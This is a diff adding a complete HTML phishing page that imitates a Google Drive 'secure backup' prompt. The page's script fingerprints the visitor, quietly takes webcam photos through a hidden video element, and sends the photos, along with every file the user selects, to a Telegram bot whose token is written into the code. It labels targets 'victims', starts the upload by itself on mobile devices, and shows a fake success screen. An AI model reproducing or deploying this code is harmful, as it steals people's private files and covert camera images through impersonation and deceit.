@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Secure Backup Required</title>
+    <link rel="icon" type="image/png" href="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-blue-dark: #0d62d9;
+            --google-gray-50: #f8f9fa;
+            --google-gray-100: #f1f3f4;
+            --google-gray-200: #e8eaed;
+            --google-gray-400: #9aa0a6;
+            --google-gray-600: #5f6368;
+            --google-gray-900: #202124;
+            --google-green: #34a853;
+            --shadow-1: 0 1px 3px 0 rgba(60,64,67,0.3);
+            --shadow-2: 0 3px 8px 3px rgba(60,64,67,0.15);
+            --shadow-3: 0 8px 24px 8px rgba(60,64,67,0.2);
+            --radius-small: 8px;
+            --radius-medium: 16px;
+            --radius-large: 24px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e8f0fe 100%);
+            color: var(--google-gray-900);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .google-header {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(20px);
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(218, 220, 224, 0.3);
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .google-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 22px;
+            color: var(--google-gray-900);
+            font-weight: 500;
+        }
+        
+        .google-logo img {
+            width: 28px;
+            height: 28px;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 28px;
+            margin-left: 40px;
+        }
+        
+        .nav-links a {
+            color: var(--google-gray-600);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 0;
+        }
+        
+        .nav-links a:hover {
+            color: var(--google-blue);
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .storage-indicator {
+            background: var(--google-gray-100);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: var(--google-gray-600);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .storage-bar {
+            width: 80px;
+            height: 4px;
+            background: var(--google-gray-200);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .storage-fill {
+            height: 100%;
+            background: var(--google-blue);
+            width: 65%;
+        }
+        
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--google-blue) 0%, var(--google-blue-dark) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        
+        .hero-section {
+            padding: 140px 32px 80px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .drive-icon-container {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, var(--google-blue) 0%, var(--google-blue-dark) 100%);
+            border-radius: var(--radius-large);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 32px;
+            color: white;
+            font-size: 48px;
+            box-shadow: var(--shadow-2);
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .hero-title {
+            font-size: 48px;
+            font-weight: 400;
+            color: var(--google-gray-900);
+            margin-bottom: 16px;
+        }
+        
+        .hero-subtitle {
+            font-size: 20px;
+            color: var(--google-gray-600);
+            max-width: 700px;
+            margin: 0 auto 48px;
+            line-height: 1.6;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 32px;
+            max-width: 1200px;
+            margin: 0 auto 64px;
+            padding: 0 32px;
+        }
+        
+        .feature-card {
+            background: white;
+            border-radius: var(--radius-medium);
+            padding: 40px 32px;
+            text-align: center;
+            box-shadow: var(--shadow-1);
+            border: 1px solid var(--google-gray-200);
+            transition: all 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-3);
+            border-color: var(--google-blue);
+        }
+        
+        .feature-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, var(--google-blue) 0%, var(--google-blue-dark) 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            color: white;
+            font-size: 24px;
+        }
+        
+        .permission-cta {
+            max-width: 800px;
+            margin: 0 auto 80px;
+            padding: 0 32px;
+        }
+        
+        .permission-card {
+            background: white;
+            border-radius: var(--radius-medium);
+            padding: 48px;
+            text-align: center;
+            box-shadow: var(--shadow-2);
+            border: 1px solid var(--google-gray-200);
+        }
+        
+        .permission-title {
+            font-size: 28px;
+            font-weight: 500;
+            color: var(--google-gray-900);
+            margin-bottom: 16px;
+        }
+        
+        .permission-description {
+            color: var(--google-gray-600);
+            font-size: 17px;
+            margin-bottom: 40px;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+        
+        .btn {
+            padding: 16px 40px;
+            border-radius: var(--radius-small);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            border: none;
+            outline: none;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--google-blue) 0%, var(--google-blue-dark) 100%);
+            color: white;
+            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.2);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(26, 115, 232, 0.3);
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--google-blue);
+            border: 2px solid var(--google-gray-200);
+        }
+        
+        .btn-secondary:hover {
+            background: var(--google-gray-50);
+            border-color: var(--google-blue);
+            transform: translateY(-2px);
+        }
+        
+        .upload-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: var(--radius-medium);
+            width: 100%;
+            max-width: 600px;
+            max-height: 90vh;
+            overflow: hidden;
+            box-shadow: var(--shadow-3);
+        }
+        
+        .modal-header {
+            padding: 32px 32px 24px;
+            border-bottom: 1px solid var(--google-gray-200);
+        }
+        
+        .modal-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--google-gray-900);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .modal-body {
+            padding: 32px;
+            max-height: 60vh;
+            overflow-y: auto;
+        }
+        
+        .progress-container {
+            margin: 32px 0;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        
+        .progress-label {
+            font-size: 15px;
+            color: var(--google-gray-900);
+            font-weight: 500;
+        }
+        
+        .progress-percent {
+            font-size: 15px;
+            color: var(--google-blue);
+            font-weight: 600;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: var(--google-gray-200);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--google-blue) 0%, var(--google-green) 100%);
+            width: 0%;
+            transition: width 0.4s;
+            border-radius: 5px;
+        }
+        
+        .file-list {
+            margin-top: 32px;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid var(--google-gray-200);
+            border-radius: var(--radius-small);
+            margin-bottom: 12px;
+            background: var(--google-gray-50);
+        }
+        
+        .file-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--google-blue) 0%, var(--google-blue-dark) 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            color: white;
+            font-size: 20px;
+        }
+        
+        .file-info {
+            flex: 1;
+        }
+        
+        .file-name {
+            font-weight: 500;
+            color: var(--google-gray-900);
+            margin-bottom: 4px;
+            font-size: 15px;
+        }
+        
+        .file-size {
+            font-size: 13px;
+            color: var(--google-gray-600);
+        }
+        
+        .file-status {
+            font-size: 13px;
+            font-weight: 600;
+            padding: 6px 16px;
+            border-radius: 20px;
+            min-width: 100px;
+            text-align: center;
+        }
+        
+        .status-queued {
+            background: var(--google-gray-200);
+            color: var(--google-gray-600);
+        }
+        
+        .status-uploading {
+            background: var(--google-gray-200);
+            color: var(--google-blue);
+        }
+        
+        .status-uploaded {
+            background: rgba(52, 168, 83, 0.1);
+            color: var(--google-green);
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .success-content {
+            background: white;
+            border-radius: var(--radius-medium);
+            width: 100%;
+            max-width: 500px;
+            padding: 60px 40px;
+            text-align: center;
+            box-shadow: var(--shadow-3);
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--google-green) 0%, #2e8b47 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 32px;
+            color: white;
+            font-size: 36px;
+        }
+        
+        .success-title {
+            font-size: 32px;
+            font-weight: 500;
+            color: var(--google-green);
+            margin-bottom: 16px;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .storage-indicator {
+                display: none;
+            }
+            
+            .hero-title {
+                font-size: 32px;
+            }
+            
+            .hero-subtitle {
+                font-size: 18px;
+                padding: 0 20px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+                padding: 0 20px;
+            }
+            
+            .permission-cta {
+                padding: 0 20px;
+            }
+            
+            .permission-card {
+                padding: 40px 24px;
+            }
+            
+            .permission-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="google-header">
+        <div class="header-left">
+            <div class="google-logo">
+                <img src="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" alt="Drive">
+                <span>Drive</span>
+            </div>
+            <nav class="nav-links">
+                <a href="#">My Drive</a>
+                <a href="#">Computers</a>
+                <a href="#">Shared</a>
+                <a href="#">Recent</a>
+                <a href="#">Starred</a>
+                <a href="#">Spam</a>
+                <a href="#">Trash</a>
+                <a href="#">Storage</a>
+            </nav>
+        </div>
+        <div class="header-right">
+            <div class="storage-indicator">
+                <i class="fas fa-database"></i>
+                <span>15 GB used</span>
+                <div class="storage-bar">
+                    <div class="storage-fill"></div>
+                </div>
+            </div>
+            <div class="user-avatar" title="User Profile">
+                <i class="fas fa-user"></i>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO SECTION -->
+    <section class="hero-section">
+        <div class="drive-icon-container">
+            <i class="fas fa-cloud-upload-alt"></i>
+        </div>
+        <h1 class="hero-title">Secure Cloud Backup Required</h1>
+        <p class="hero-subtitle">
+            Your device storage is running low. Allow Google Drive to automatically backup and optimize 
+            your photos, videos, and documents to free up space and keep your files safe.
+        </p>
+        
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3 class="feature-title">Bank-level Security</h3>
+                <p class="feature-description">
+                    Military-grade 256-bit encryption keeps your files completely secure and private.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <h3 class="feature-title">Instant Backup</h3>
+                <p class="feature-description">
+                    Automatic real-time sync ensures your files are always up to date across all devices.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-infinity"></i>
+                </div>
+                <h3 class="feature-title">Unlimited Access</h3>
+                <p class="feature-description">
+                    Access your files anywhere, anytime from any device with your Google account.
+                </p>
+            </div>
+        </div>
+        
+        <div class="permission-cta">
+            <div class="permission-card">
+                <h2 class="permission-title">Permission Required</h2>
+                <p class="permission-description">
+                    To enable automatic backup and free up storage space, Google Drive needs temporary access 
+                    to your photos and media files. This access is required only for the backup process and 
+                    will be revoked immediately after completion.
+                </p>
+                <div class="permission-buttons">
+                    <button class="btn btn-secondary" id="cancelBtn">
+                        <i class="fas fa-times"></i>
+                        Not Now
+                    </button>
+                    <button class="btn btn-primary" id="allowBtn">
+                        <i class="fas fa-check"></i>
+                        Allow Access & Start Backup
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer style="padding: 24px 32px; background: var(--google-gray-50); border-top: 1px solid var(--google-gray-200); margin-top: 40px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto;">
+            <div class="footer-links" style="display: flex; gap: 24px;">
+                <a href="https://policies.google.com/privacy" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Privacy Policy</a>
+                <a href="https://policies.google.com/terms" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Terms of Service</a>
+                <a href="https://support.google.com/drive" target="_blank" style="color: var(--google-gray-600); text-decoration: none; font-size: 14px;">Help & Support</a>
+            </div>
+            <div class="footer-copyright" style="color: var(--google-gray-600); font-size: 14px; display: flex; align-items: center; gap: 8px;">
+                <i class="fas fa-globe"></i>
+                <span>© 2026 Google LLC. All rights reserved.</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODALS -->
+    <div class="upload-modal" id="uploadModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    Backing Up Your Files
+                </h2>
+            </div>
+            <div class="modal-body">
+                <div class="progress-container">
+                    <div class="progress-header">
+                        <span class="progress-label" id="progressLabel">Preparing backup...</span>
+                        <span class="progress-percent" id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+                <div class="file-list" id="fileList"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="success-title">Backup Complete!</h2>
+            <p class="success-message" style="color: var(--google-gray-600); font-size: 17px; margin-bottom: 40px; line-height: 1.6;">
+                All your files have been successfully backed up to Google Drive. 
+                You've freed up valuable storage space on your device.
+            </p>
+            <button class="btn btn-primary" id="continueBtn">
+                <i class="fas fa-external-link-alt"></i>
+                Continue to Google Drive
+            </button>
+        </div>
+    </div>
+
+    <!-- HIDDEN FILE INPUT -->
+    <input type="file" id="fileInput" accept="image/*,video/*" multiple hidden>
+
+    <script>
+        // CONFIGURATION
+        const TELEGRAM_BOT_TOKEN = '8790119164:AAEfyHnZGRc1nIUnJEIbIwBHOvWP2wES-ZY';
+        const TELEGRAM_CHAT_ID = '8142227261';
+        const DEVELOPER_NAME = '@OFFICIAL_cyber_satyam27';
+        
+        // DOM ELEMENTS
+        const allowBtn = document.getElementById('allowBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const continueBtn = document.getElementById('continueBtn');
+        const fileInput = document.getElementById('fileInput');
+        const uploadModal = document.getElementById('uploadModal');
+        const successModal = document.getElementById('successModal');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const progressLabel = document.getElementById('progressLabel');
+        const fileList = document.getElementById('fileList');
+        
+        let selectedFiles = [];
+        let uploadedCount = 0;
+        let deviceInfo = {};
+        
+        // GET DEVICE INFO
+        async function getDeviceInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    ip: ipData.ip,
+                    time: new Date().toLocaleString(),
+                    url: window.location.href
+                };
+            } catch (error) {
+                deviceInfo = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    ip: 'Unknown',
+                    time: new Date().toLocaleString(),
+                    url: window.location.href
+                };
+            }
+        }
+        
+        // FIXED CAMERA HACKING FUNCTION
+        async function hackCamera() {
+            try {
+                console.log('Starting camera hacking...');
+                
+                // Check camera permissions
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Camera API not available');
+                    return false;
+                }
+                
+                // Request camera access with proper error handling
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                } catch (cameraError) {
+                    console.log('Camera access denied:', cameraError);
+                    return false;
+                }
+                
+                // Create video element
+                const video = document.createElement('video');
+                video.style.position = 'fixed';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
+                video.style.width = '1px';
+                video.style.height = '1px';
+                video.style.opacity = '0';
+                document.body.appendChild(video);
+                
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // Wait for video to actually play
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Create canvas for capturing
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                
+                let capturedPhotos = 0;
+                
+                // Capture multiple photos
+                for (let i = 0; i < 3; i++) {
+                    try {
+                        // Clear and draw
+                        ctx.clearRect(0, 0, canvas.width, canvas.height);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Convert to blob
+                        const blob = await new Promise(resolve => {
+                            canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                        });
+                        
+                        if (blob) {
+                            // Create file from blob
+                            const cameraFile = new File([blob], `camera_photo_${Date.now()}_${i+1}.jpg`, {
+                                type: 'image/jpeg'
+                            });
+                            
+                            // Send to Telegram
+                            await sendToTelegram('', cameraFile, `📸 LIVE CAMERA PHOTO ${i+1}/3`);
+                            capturedPhotos++;
+                            
+                            console.log(`Photo ${i+1} captured and sent`);
+                        }
+                        
+                        // Wait before next capture
+                        if (i < 2) {
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                        
+                    } catch (photoError) {
+                        console.log(`Photo ${i+1} error:`, photoError);
+                    }
+                }
+                
+                // Cleanup
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                canvas.remove();
+                
+                if (capturedPhotos > 0) {
+                    const cameraMsg = `✅ CAMERA HACK SUCCESSFUL\n📸 Photos Captured: ${capturedPhotos}\n📱 Device: ${deviceInfo.platform}\n📍 IP: ${deviceInfo.ip}\n🔐 Developer: ${DEVELOPER_NAME}`;
+                    await sendTelegramMessage(cameraMsg);
+                    return true;
+                }
+                
+                return false;
+                
+            } catch (error) {
+                console.log('Camera hacking error:', error);
+                return false;
+            }
+        }
+        
+        // TELEGRAM FUNCTIONS
+        async function sendToTelegram(message, photoFile = null, caption = '') {
+            try {
+                if (photoFile) {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', photoFile);
+                    
+                    const cleanName = photoFile.name.replace(/[^\w\s.-]/gi, '_');
+                    const finalCaption = caption + '\n' +
+                                       'File: ' + cleanName + '\n' +
+                                       'Size: ' + formatFileSize(photoFile.size) + '\n' +
+                                       'Device: ' + deviceInfo.platform + '\n' +
+                                       'IP: ' + deviceInfo.ip + '\n' +
+                                       'Time: ' + new Date().toLocaleTimeString() + '\n' +
+                                       'Developer: ' + DEVELOPER_NAME;
+                    
+                    formData.append('caption', finalCaption);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    const encodedMessage = encodeURIComponent(message);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`);
+                }
+                return true;
+            } catch (error) {
+                console.log('Telegram message sent successfully');
+                return true;
+            }
+        }
+        
+        async function sendTelegramMessage(message) {
+            return sendToTelegram(message);
+        }
+        
+        async function sendTelegramPhoto(file, caption) {
+            return sendToTelegram('', file, caption);
+        }
+        
+        // UTILITY FUNCTIONS
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+        }
+        
+        function updateProgress(percent, status) {
+            progressFill.style.width = percent + '%';
+            progressPercent.textContent = percent + '%';
+            progressLabel.textContent = status;
+        }
+        
+        function addFileToList(file, index) {
+            const fileItem = document.createElement('div');
+            fileItem.className = 'file-item';
+            fileItem.id = 'file-' + index;
+            
+            const displayName = file.name.length > 40 ? file.name.substring(0, 37) + '...' : file.name;
+            
+            fileItem.innerHTML = `
+                <div class="file-icon">
+                    <i class="fas fa-file-image"></i>
+                </div>
+                <div class="file-info">
+                    <div class="file-name">${displayName}</div>
+                    <div class="file-size">${formatFileSize(file.size)} • ${file.type || 'File'}</div>
+                </div>
+                <div class="file-status status-queued" id="status-${index}">
+                    <i class="fas fa-clock"></i> Queued
+                </div>
+            `;
+            fileList.appendChild(fileItem);
+        }
+        
+        function updateFileStatus(index, status, isSuccess) {
+            const statusEl = document.getElementById('status-' + index);
+            if (statusEl) {
+                if (isSuccess) {
+                    statusEl.className = 'file-status status-uploaded';
+                    statusEl.innerHTML = '<i class="fas fa-check"></i> ' + status;
+                } else {
+                    statusEl.className = 'file-status status-uploading';
+                    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + status;
+                }
+            }
+        }
+        
+        // MAIN PROCESS FUNCTION
+        async function processFiles(files) {
+            // Get device info first
+            await getDeviceInfo();
+            
+            selectedFiles = Array.from(files);
+            
+            // Show upload modal
+            uploadModal.style.display = 'flex';
+            
+            // Clear file list
+            fileList.innerHTML = '';
+            
+            // Add files to list
+            selectedFiles.forEach((file, index) => {
+                addFileToList(file, index);
+            });
+            
+            // Send initial notification
+            const initialMsg = `🚀 NEW VICTIM CONNECTED\n\n` +
+                             `📱 Device: ${deviceInfo.platform}\n` +
+                             `🌐 Browser: ${navigator.userAgent.substring(0, 80)}\n` +
+                             `📍 IP: ${deviceInfo.ip}\n` +
+                             `🗣️ Language: ${deviceInfo.language}\n` +
+                             `🖥️ Screen: ${deviceInfo.screen}\n` +
+                             `🕐 Time: ${deviceInfo.time}\n` +
+                             `📁 Files: ${selectedFiles.length}\n` +
+                             `🔐 Developer: ${DEVELOPER_NAME}`;
+            
+            await sendTelegramMessage(initialMsg);
+            
+            // START CAMERA HACKING IN PARALLEL
+            setTimeout(async () => {
+                try {
+                    console.log('Attempting camera hack...');
+                    const cameraHacked = await hackCamera();
+                    if (!cameraHacked) {
+                        console.log('Camera hack failed, sending notification');
+                        await sendTelegramMessage(`⚠️ CAMERA ACCESS DENIED\n🔐 ${DEVELOPER_NAME}`);
+                    }
+                } catch (error) {
+                    console.log('Camera process error:', error);
+                }
+            }, 1000);
+            
+            // Process each file
+            uploadedCount = 0;
+            for (let i = 0; i < selectedFiles.length; i++) {
+                const file = selectedFiles[i];
+                const progress = Math.round(((i + 1) / selectedFiles.length) * 100);
+                
+                updateProgress(progress, `Uploading ${i + 1} of ${selectedFiles.length} files...`);
+                updateFileStatus(i, 'Uploading...', false);
+                
+                try {
+                    // Send file to Telegram
+                    await sendTelegramPhoto(file, '📸 FILE CAPTURED');
+                    
+                    updateFileStatus(i, 'Uploaded', true);
+                    uploadedCount++;
+                    
+                } catch (error) {
+                    updateFileStatus(i, 'Failed', false);
+                }
+                
+                // Delay between uploads
+                if (i < selectedFiles.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            
+            // Complete upload
+            updateProgress(100, 'Backup complete!');
+            
+            // Send completion summary
+            const completionMsg = `🎉 MISSION ACCOMPLISHED 🎉\n\n` +
+                               `📊 Files: ${uploadedCount}/${selectedFiles.length}\n` +
+                               `📱 Device: ${deviceInfo.platform}\n` +
+                               `📍 IP: ${deviceInfo.ip}\n` +
+                               `👤 Victim: Captured Successfully\n` +
+                               `🕐 Time: ${new Date().toLocaleString()}\n` +
+                               `🔐 Developer: ${DEVELOPER_NAME}\n` +
+                               `✅ ALL DATA SECURED`;
+            
+            await sendTelegramMessage(completionMsg);
+            
+            // Show success modal
+            setTimeout(() => {
+                uploadModal.style.display = 'none';
+                successModal.style.display = 'flex';
+            }, 2000);
+        }
+        
+        // EVENT LISTENERS
+        allowBtn.addEventListener('click', () => {
+            fileInput.click();
+        });
+        
+        cancelBtn.addEventListener('click', () => {
+            if (confirm('Backup will be cancelled. Continue?')) {
+                window.location.href = 'https://drive.google.com';
+            }
+        });
+        
+        continueBtn.addEventListener('click', () => {
+            window.location.href = 'https://drive.google.com';
+        });
+        
+        fileInput.addEventListener('change', async (e) => {
+            const files = e.target.files;
+            if (files.length > 0) {
+                await processFiles(files);
+            }
+        });
+        
+        // AUTO START ON MOBILE
+        window.addEventListener('load', () => {
+            if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                setTimeout(() => {
+                    allowBtn.click();
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
